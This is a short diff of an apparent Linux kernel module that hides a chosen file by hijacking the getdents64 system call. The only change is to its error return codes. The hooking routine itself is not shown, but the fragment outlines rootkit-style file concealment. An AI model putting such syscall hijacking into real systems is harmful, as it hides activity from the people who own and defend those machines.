@@ -61,12 +61,12 @@ int load(void) {
     pr_info("Initializing...");
     if (file_name_to_hide == NULL) {
         pr_warn("File name to hide has not been set! Exiting...");
-        return -1;
+        return -EINVAL;
     }
 
     unsigned long getdents_address = hijack_syscall(__NR_getdents64, (unsigned long)new_getdents64);
     if (!getdents_address) {
-        return -1;
+        return -ENXIO;
     }
     
     original_getdents64_ptr = (original_getdents64_t)getdents_address;
